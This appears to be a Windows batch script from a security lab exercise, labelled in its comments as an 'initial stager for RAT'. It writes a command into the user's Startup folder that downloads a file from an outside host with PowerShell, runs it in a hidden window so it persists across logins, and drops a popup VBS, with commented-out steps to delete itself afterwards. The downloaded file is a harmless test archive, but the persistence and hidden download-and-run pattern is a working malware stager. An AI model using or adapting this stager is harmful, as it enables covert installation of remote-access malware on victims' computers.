@echo off
@REM initial stager for RAT
@REM vvp for CNSLAB

@REM variables
set "INDEXPATH=%cd%"
set "STARTUP='C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'"


@REM move into startup directory
cd %STARTUP%

@REM Write Payloads here
(powershell -c "Invoke-WebRequest -Uri 'ipv4.download.thinkbroadband.com/5MB.zip' -OutFile 'poc.zip'")> "%STARTUP%/postindex.cmd"

@REM Run payload
powershell Start-Process cmd.exe -windowstyle hidden "postindex.cmd"

pause

@REM cd back to initial/index Path
cd "%INDEXPATH%"
(echo MsgBox "Line 1" ^& vbCrLf ^& "Line 2",262192, "Title")> popup.vbs
@REM del index.cmd

@REM (
@REM     echo @echo OFF
@REM        echo :loop
@REM )

@REM 
cd %STARTUP%
@REM
(powershell -c "Invoke-WebRequest -Uri 'ipv4.download.thinkbroadband.com/5MB.zip' -OutFile 'poc.zip'")> "%STARTUP%/postindex.cmd"

cd "%INDEXPATH%"
(echo MsgBox "Hello" ^& vbCrLf ^& "Line 2",262192, "Title")> popup.vbs

@REM del index.cmd and initial stuff after spawning